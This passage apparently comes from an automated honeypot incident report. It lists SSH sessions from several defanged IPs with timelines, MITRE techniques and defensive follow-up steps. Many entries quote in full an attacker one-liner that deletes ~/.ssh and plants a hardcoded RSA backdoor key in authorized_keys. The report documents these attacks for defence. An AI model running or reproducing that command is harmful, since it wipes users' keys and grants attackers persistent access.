| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:30:09` | `cowrie.session.connect` |
| `2026-04-13 06:30:09` | `cowrie.client.version` |
| `2026-04-13 06:30:09` | `cowrie.client.kex` |
| `2026-04-13 06:30:11` | `cowrie.login.success` |
| `2026-04-13 06:30:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f59a95d29781

| Field | Detail |
|---|---|
| **Source IP** | `112.216.108[.]62` |
| **First Seen** | 2026-04-13 06:31 |
| **Last Seen** | 2026-04-13 06:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:31:03` | `cowrie.session.connect` |
| `2026-04-13 06:31:03` | `cowrie.client.version` |
| `2026-04-13 06:31:03` | `cowrie.client.kex` |
| `2026-04-13 06:31:04` | `cowrie.login.success` |
| `2026-04-13 06:31:04` | `cowrie.session.params` |
| `2026-04-13 06:31:04` | `cowrie.command.input` |
| `2026-04-13 06:31:04` | `cowrie.command.failed` |
| `2026-04-13 06:31:04` | `cowrie.log.closed` |
| `2026-04-13 06:31:05` | `cowrie.session.params` |
| `2026-04-13 06:31:05` | `cowrie.command.input` |
| `2026-04-13 06:31:05` | `cowrie.session.file_download` |
| `2026-04-13 06:31:05` | `cowrie.log.closed` |
| `2026-04-13 06:31:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.216.108[.]62` to AbuseIPDB if not already reported
- [ ] Block `112.216.108[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-147a55bc53bb

| Field | Detail |
|---|---|
| **Source IP** | `112.216.108[.]62` |
| **First Seen** | 2026-04-13 06:31 |
| **Last Seen** | 2026-04-13 06:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:31:07` | `cowrie.session.connect` |
| `2026-04-13 06:31:07` | `cowrie.client.version` |
| `2026-04-13 06:31:07` | `cowrie.client.kex` |
| `2026-04-13 06:31:07` | `cowrie.login.success` |
| `2026-04-13 06:31:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.216.108[.]62` to AbuseIPDB if not already reported
- [ ] Block `112.216.108[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b89c8822d98b

| Field | Detail |
|---|---|
| **Source IP** | `177.70.6[.]158` |
| **First Seen** | 2026-04-13 06:31 |
| **Last Seen** | 2026-04-13 06:31 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:31:32` | `cowrie.session.connect` |
| `2026-04-13 06:31:32` | `cowrie.client.version` |
| `2026-04-13 06:31:32` | `cowrie.client.kex` |
| `2026-04-13 06:31:33` | `cowrie.login.success` |
| `2026-04-13 06:31:34` | `cowrie.session.params` |
| `2026-04-13 06:31:34` | `cowrie.command.input` |
| `2026-04-13 06:31:34` | `cowrie.command.failed` |
| `2026-04-13 06:31:34` | `cowrie.log.closed` |
| `2026-04-13 06:31:35` | `cowrie.session.params` |
| `2026-04-13 06:31:35` | `cowrie.command.input` |
| `2026-04-13 06:31:35` | `cowrie.session.file_download` |
| `2026-04-13 06:31:35` | `cowrie.log.closed` |
| `2026-04-13 06:31:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.70.6[.]158` to AbuseIPDB if not already reported
- [ ] Block `177.70.6[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b149acbf4359

| Field | Detail |
|---|---|
| **Source IP** | `177.70.6[.]158` |
| **First Seen** | 2026-04-13 06:31 |
| **Last Seen** | 2026-04-13 06:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:31:39` | `cowrie.session.connect` |
| `2026-04-13 06:31:39` | `cowrie.client.version` |
| `2026-04-13 06:31:39` | `cowrie.client.kex` |
| `2026-04-13 06:31:41` | `cowrie.login.success` |
| `2026-04-13 06:31:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.70.6[.]158` to AbuseIPDB if not already reported
- [ ] Block `177.70.6[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3033efd810b3

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-13 06:31 |
| **Last Seen** | 2026-04-13 06:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:31:51` | `cowrie.session.connect` |
| `2026-04-13 06:31:51` | `cowrie.client.version` |
| `2026-04-13 06:31:52` | `cowrie.client.kex` |
| `2026-04-13 06:31:53` | `cowrie.login.success` |
| `2026-04-13 06:31:54` | `cowrie.session.params` |
| `2026-04-13 06:31:54` | `cowrie.command.input` |
| `2026-04-13 06:31:54` | `cowrie.command.failed` |
| `2026-04-13 06:31:54` | `cowrie.log.closed` |
| `2026-04-13 06:31:55` | `cowrie.session.params` |
| `2026-04-13 06:31:55` | `cowrie.command.input` |
| `2026-04-13 06:31:55` | `cowrie.session.file_download` |
| `2026-04-13 06:31:55` | `cowrie.log.closed` |
| `2026-04-13 06:32:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1990146f325

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-13 06:31 |
| **Last Seen** | 2026-04-13 06:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:31:58` | `cowrie.session.connect` |
| `2026-04-13 06:31:58` | `cowrie.client.version` |
| `2026-04-13 06:31:59` | `cowrie.client.kex` |
| `2026-04-13 06:32:00` | `cowrie.login.success` |
| `2026-04-13 06:32:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9709bbb84b4

| Field | Detail |
|---|---|
| **Source IP** | `14.103.117[.]91` |
| **First Seen** | 2026-04-13 06:33 |
| **Last Seen** | 2026-04-13 06:33 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:33:14` | `cowrie.session.connect` |
| `2026-04-13 06:33:14` | `cowrie.client.version` |
| `2026-04-13 06:33:15` | `cowrie.client.kex` |
| `2026-04-13 06:33:16` | `cowrie.login.success` |
| `2026-04-13 06:33:16` | `cowrie.session.params` |
| `2026-04-13 06:33:16` | `cowrie.command.input` |
| `2026-04-13 06:33:16` | `cowrie.command.failed` |
| `2026-04-13 06:33:17` | `cowrie.log.closed` |
| `2026-04-13 06:33:17` | `cowrie.session.params` |
| `2026-04-13 06:33:17` | `cowrie.command.input` |
| `2026-04-13 06:33:17` | `cowrie.session.file_download` |
| `2026-04-13 06:33:17` | `cowrie.log.closed` |
| `2026-04-13 06:33:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.117[.]91` to AbuseIPDB if not already reported
- [ ] Block `14.103.117[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-201e1bf96274

| Field | Detail |
|---|---|
| **Source IP** | `103.123.53[.]88` |
| **First Seen** | 2026-04-13 06:33 |
| **Last Seen** | 2026-04-13 06:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:33:18` | `cowrie.session.connect` |
| `2026-04-13 06:33:18` | `cowrie.client.version` |
| `2026-04-13 06:33:18` | `cowrie.client.kex` |
| `2026-04-13 06:33:18` | `cowrie.login.success` |
| `2026-04-13 06:33:18` | `cowrie.session.params` |
| `2026-04-13 06:33:18` | `cowrie.command.input` |
| `2026-04-13 06:33:18` | `cowrie.command.failed` |
| `2026-04-13 06:33:18` | `cowrie.log.closed` |
| `2026-04-13 06:33:18` | `cowrie.session.params` |
| `2026-04-13 06:33:18` | `cowrie.command.input` |
| `2026-04-13 06:33:18` | `cowrie.session.file_download` |
| `2026-04-13 06:33:18` | `cowrie.log.closed` |
| `2026-04-13 06:33:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.123.53[.]88` to AbuseIPDB if not already reported
- [ ] Block `103.123.53[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-907e2404c659

| Field | Detail |
|---|---|
| **Source IP** | `103.123.53[.]88` |
| **First Seen** | 2026-04-13 06:33 |
| **Last Seen** | 2026-04-13 06:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:33:20` | `cowrie.session.connect` |
| `2026-04-13 06:33:20` | `cowrie.client.version` |
| `2026-04-13 06:33:20` | `cowrie.client.kex` |
| `2026-04-13 06:33:20` | `cowrie.login.success` |
| `2026-04-13 06:33:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.123.53[.]88` to AbuseIPDB if not already reported
- [ ] Block `103.123.53[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-098b85903641

| Field | Detail |
|---|---|
| **Source IP** | `177.70.6[.]158` |
| **First Seen** | 2026-04-13 06:33 |
| **Last Seen** | 2026-04-13 06:33 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:33:22` | `cowrie.session.connect` |
| `2026-04-13 06:33:22` | `cowrie.client.version` |
| `2026-04-13 06:33:22` | `cowrie.client.kex` |
| `2026-04-13 06:33:23` | `cowrie.login.success` |
| `2026-04-13 06:33:24` | `cowrie.session.params` |
| `2026-04-13 06:33:24` | `cowrie.command.input` |
| `2026-04-13 06:33:24` | `cowrie.command.failed` |
| `2026-04-13 06:33:24` | `cowrie.log.closed` |
| `2026-04-13 06:33:25` | `cowrie.session.params` |
| `2026-04-13 06:33:25` | `cowrie.command.input` |
| `2026-04-13 06:33:25` | `cowrie.session.file_download` |
| `2026-04-13 06:33:25` | `cowrie.log.closed` |
| `2026-04-13 06:33:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.70.6[.]158` to AbuseIPDB if not already reported
- [ ] Block `177.70.6[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c35075919ad

| Field | Detail |
|---|---|
| **Source IP** | `14.103.117[.]91` |
| **First Seen** | 2026-04-13 06:33 |
| **Last Seen** | 2026-04-13 06:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:33:26` | `cowrie.session.connect` |
| `2026-04-13 06:33:26` | `cowrie.client.version` |
| `2026-04-13 06:33:26` | `cowrie.client.kex` |
| `2026-04-13 06:33:27` | `cowrie.login.success` |
| `2026-04-13 06:33:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.117[.]91` to AbuseIPDB if not already reported
- [ ] Block `14.103.117[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70fded969953

| Field | Detail |
|---|---|
| **Source IP** | `177.70.6[.]158` |
| **First Seen** | 2026-04-13 06:33 |
| **Last Seen** | 2026-04-13 06:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:33:29` | `cowrie.session.connect` |
| `2026-04-13 06:33:29` | `cowrie.client.version` |
| `2026-04-13 06:33:29` | `cowrie.client.kex` |
| `2026-04-13 06:33:31` | `cowrie.login.success` |
| `2026-04-13 06:33:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.70.6[.]158` to AbuseIPDB if not already reported
- [ ] Block `177.70.6[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9e8106c27c6

| Field | Detail |
|---|---|
| **Source IP** | `112.216.108[.]62` |
| **First Seen** | 2026-04-13 06:33 |
| **Last Seen** | 2026-04-13 06:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:33:33` | `cowrie.session.connect` |
| `2026-04-13 06:33:33` | `cowrie.client.version` |
| `2026-04-13 06:33:34` | `cowrie.client.kex` |
| `2026-04-13 06:33:34` | `cowrie.login.success` |
| `2026-04-13 06:33:34` | `cowrie.session.params` |
| `2026-04-13 06:33:34` | `cowrie.command.input` |
| `2026-04-13 06:33:34` | `cowrie.command.failed` |
| `2026-04-13 06:33:35` | `cowrie.log.closed` |
| `2026-04-13 06:33:35` | `cowrie.session.params` |
| `2026-04-13 06:33:35` | `cowrie.command.input` |
| `2026-04-13 06:33:35` | `cowrie.session.file_download` |
| `2026-04-13 06:33:35` | `cowrie.log.closed` |
| `2026-04-13 06:33:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.216.108[.]62` to AbuseIPDB if not already reported
- [ ] Block `112.216.108[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97efc805bdf0

| Field | Detail |
|---|---|
| **Source IP** | `112.216.108[.]62` |
| **First Seen** | 2026-04-13 06:33 |
| **Last Seen** | 2026-04-13 06:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:33:37` | `cowrie.session.connect` |
| `2026-04-13 06:33:37` | `cowrie.client.version` |
| `2026-04-13 06:33:37` | `cowrie.client.kex` |
| `2026-04-13 06:33:38` | `cowrie.login.success` |
| `2026-04-13 06:33:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.216.108[.]62` to AbuseIPDB if not already reported
- [ ] Block `112.216.108[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ab8008ce153

| Field | Detail |
|---|---|
| **Source IP** | `103.123.53[.]88` |
| **First Seen** | 2026-04-13 06:35 |
| **Last Seen** | 2026-04-13 06:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:35:04` | `cowrie.session.connect` |
| `2026-04-13 06:35:04` | `cowrie.client.version` |
| `2026-04-13 06:35:04` | `cowrie.client.kex` |
| `2026-04-13 06:35:04` | `cowrie.login.success` |
| `2026-04-13 06:35:04` | `cowrie.session.params` |
| `2026-04-13 06:35:04` | `cowrie.command.input` |
| `2026-04-13 06:35:04` | `cowrie.command.failed` |
| `2026-04-13 06:35:04` | `cowrie.log.closed` |
| `2026-04-13 06:35:04` | `cowrie.session.params` |
| `2026-04-13 06:35:04` | `cowrie.command.input` |
| `2026-04-13 06:35:04` | `cowrie.session.file_download` |
| `2026-04-13 06:35:04` | `cowrie.log.closed` |
| `2026-04-13 06:35:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.123.53[.]88` to AbuseIPDB if not already reported
- [ ] Block `103.123.53[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b11204fc7f4f

| Field | Detail |
|---|---|
| **Source IP** | `103.123.53[.]88` |
| **First Seen** | 2026-04-13 06:35 |
| **Last Seen** | 2026-04-13 06:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:35:05` | `cowrie.session.connect` |
| `2026-04-13 06:35:05` | `cowrie.client.version` |
| `2026-04-13 06:35:05` | `cowrie.client.kex` |
| `2026-04-13 06:35:06` | `cowrie.login.success` |
| `2026-04-13 06:35:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.123.53[.]88` to AbuseIPDB if not already reported
- [ ] Block `103.123.53[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5ab2091d62a

| Field | Detail |
|---|---|
| **Source IP** | `177.70.6[.]158` |
| **First Seen** | 2026-04-13 06:35 |
| **Last Seen** | 2026-04-13 06:35 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
